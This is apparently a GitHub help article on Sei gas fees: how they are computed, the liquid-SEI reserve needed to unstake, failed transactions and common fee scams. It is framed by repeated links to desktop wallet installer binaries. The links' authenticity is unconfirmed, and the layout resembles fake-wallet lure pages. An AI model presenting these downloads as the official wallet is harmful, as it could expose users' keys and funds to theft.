![Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/raw/main/assets/banner-article.png)

<h1 align="center">Sei gas fees and what Sei Wallet shows before you sign</h1>

<p align="center">What the fee line means, why it is paid in SEI, and how to set it.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Every transaction on Sei costs a fee, paid in SEI, and the fee goes to validators rather than being burned. There is no refund if the transaction fails, no subscription that removes it, and no legitimate service that takes a fee in exchange for "unlocking" anything.

Understanding the number is mostly about two things: what you are paying for, and why a fully bonded account cannot pay at all.

## What the fee is made of

Two quantities multiply:

- **Gas used** - a measure of the work the transaction does. A plain SEI transfer is cheap; a contract call, a staking operation or an unbonding transaction is more work.
- **Gas price** - what you are willing to pay per unit. Sei's documentation lists a minimum gas price of 50 gwei - a governance-set floor rather than a fixed constant - and the network's fee market decides what actually gets included promptly.

The product is the fee. Higher gas price means faster inclusion, up to the point where nothing is congested and the extra buys you nothing.

One structural detail worth knowing: Sei does not burn a base fee the way Ethereum does, so all of the fee reaches validators. That is why the number you pay is the number they receive, with no hidden burn.

## Why the amount changes between transactions

The same wallet can show very different fees for actions that feel similar:

| Action | Relative cost | Why |
|---|---|---|
| Sending SEI | Low | One simple transfer |
| Staking or redelegating | Moderate | Delegation bookkeeping |
| Claiming rewards | Moderate | A transaction in its own right |
| Unbonding | Moderate | Starts the exit and its queue entry |
| Contract calls, swaps, bridges | Highest | Arbitrary computation |

A bridge or a swap can cost many times a transfer, because it executes contract logic rather than moving a balance. If a fee looks disproportionate, check what the transaction is actually asking the chain to do - [the confirmation screen](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) describes the action, not just the amount.

## The reserve rule that catches people

Fees are paid in liquid SEI. Bonded stake is not liquid. So an account whose entire balance is delegated has nothing to pay with, and the unbonding transaction that would free it cannot be broadcast.

That is a deadlock with one exit: get a small amount of SEI to that address from elsewhere, then unstake. Waiting does not help, and reinstalling does not help, because the problem is on-chain rather than in the app.

The prevention is accounting rather than discipline. Decide before you delegate what share of the balance stays liquid, then treat that share as already committed to future fees - because it is.

## A failed transaction still costs gas

If a transaction reverts, the work was still performed, so the fee is still charged. What you do not lose is the amount you were trying to move: it stays in your account.

That asymmetry confuses people who expect a failed operation to be free. The mental model: you pay for computation, not for success. [Error messages](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) covers the common revert reasons, most of which are fixable on the second attempt.

## What the app shows before you sign

A confirmation screen should present three things: the recipient, the amount, and the fee. Read all three, on the device as well if a hardware wallet is attached.

Two habits make this reliable:

- **Compare the fee with previous transactions of the same kind.** A sudden multiple is either a busier network or a different kind of transaction; both are worth noticing before signing.
- **Check the recipient against what you intended**, character by character at the ends. Fee mistakes cost a little; recipient mistakes cost everything.

## Speeding up and replacing

A transaction that is not confirming can sometimes be replaced by submitting another with the same nonce and a higher fee. Whether this app exposes that control is a product detail I did not verify; the mechanism, and the fact that the replacement must go to the same recipient for the same amount, is described in [transactions that will not confirm](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md).

Raising the fee on a *later* transaction does nothing while an earlier nonce is stuck. That ordering is the part people miss.

## Fee-related scams

- **"Pay a fee to release your funds."** No such mechanism exists. A confirmed transfer is final regardless of any payment.
- **"We will refund your gas."** Nobody can. The fee went to validators.
- **"Send SEI to this address to activate your wallet."** Activation is not a thing; sending SEI is just sending SEI.
- **A "fee estimator" site that asks you to connect a wallet** and sign a message. Estimating a fee needs no signature.

The general pattern, including the support-impersonation version, is in [the wrong-address guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)'s scam section.

## Where the memo fits, and where it does not

A memo is routing information attached to a deposit, not a fee. It costs nothing and it does not change what you pay. If a deposit form asks for both a memo and a fee, the fee is the network fee and the memo is a label - [memo fields](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md) covers the second.

## If your SEI came from another wallet

A transfer from Compass, Keplr or an exchange all cost their own network fee at the sending end, which you may have paid already and cannot recover. What matters afterwards is that your new account holds enough liquid SEI to transact - a freshly imported wallet with a fully staked balance is the deadlock above, waiting to happen. [The Compass transfer](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the worked example of moving in without stranding yourself.

## Frequently asked questions

**What does a Sei transaction cost?** The gas used multiplied by the gas price, paid in SEI. A simple transfer is the cheapest case; contract calls can cost many times more.

**Who receives the fee?** Validators. Sei does not burn a base fee.

**Do I pay if the transaction fails?** Yes. Computation was performed and the fee is charged; the amount you were moving stays in your account.

**Why can't I unstake?** Most often no liquid SEI for the fee, because the whole balance is bonded. Send a small amount to that address, then unstake.

**Can I choose a lower fee?** The app offers what the network accepts; below the minimum, the transaction will not be included. A low fee means waiting, not saving.

**Is a higher fee always better?** Only when something is actually congested. Otherwise it is a donation to validators.

**Do I pay a fee to receive SEI?** No. Receiving is not a transaction you send, and the sender pays.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [A failed Sei Wallet transaction: what each error means](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [Sent SEI to the wrong address from Sei Wallet: what is recoverable](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)
